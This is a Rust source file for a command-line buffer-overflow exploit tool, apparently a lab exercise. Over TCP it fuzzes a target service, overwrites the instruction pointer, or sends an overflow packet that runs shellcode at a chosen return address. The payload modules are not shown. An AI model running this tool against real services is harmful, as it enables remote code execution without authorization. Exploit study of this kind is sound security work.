use std::net::TcpStream;
use std::io;
use std::io::Write;
use std::result::Result;
use clap::Parser;
use serde::*;

mod interact;
mod packet_generators;
mod parsers;

use crate::interact::interact;
use crate::packet_generators::*;
use crate::parsers::return_address_parser;

#[derive(
    clap::ValueEnum, Clone, Debug, Serialize,
)]
#[serde(rename_all = "kebab-case")]
enum Command {
    Interact,
    Fuzz,
    OverwriteEIP,
    Exploit
}

#[derive(Parser, Debug)]
#[command(name = "Exploit-Rust")]
#[command(version, about, long_about = "
   interact - sends a regular message
   fuzz - overflows the buffer with pattern 
   overwrite-ip - overwrites the instruction pointer with deadbeef value
   exploit - overflows the buffer and executes a shellcode")]
struct Args {
    #[arg(value_enum)]
    command: Command,
    #[arg(help = "in url format <ip:port>, e.g. 127.0.0.1:3000")]
    host: String,
    #[arg(value_parser = return_address_parser, help = "in hex format, e.g. ffff0010")]
    return_address: u32
}

fn send_packet(stream: &mut TcpStream, packet: Vec<u8>) -> Result<usize,String> {
    match stream.write(packet.as_slice()) {
        Ok(stream) => Ok(stream),
        Err(e) => {
            return Err(format!("Failed to write to stream: {}", e));
        }
    }
}

fn main() -> io::Result<()> {
    let args = Args::parse();

    let mut stream = match TcpStream::connect(args.host) {
        Ok(stream) => stream,
        Err(e) => {
            eprintln!("Failed to connect to host: {}", e);
            return Err(e)
        }
    };

    use Command::*;
    let _result = match args.command {
        Interact => interact(&mut stream),
        Fuzz => send_packet(&mut stream, generate_fuzz_packet()),
        OverwriteEIP => send_packet(&mut stream, generate_overwrite_eip_packet()),
        Exploit => send_packet(&mut stream, generate_exploit_packet(args.return_address)),
    };
    Ok(())
}
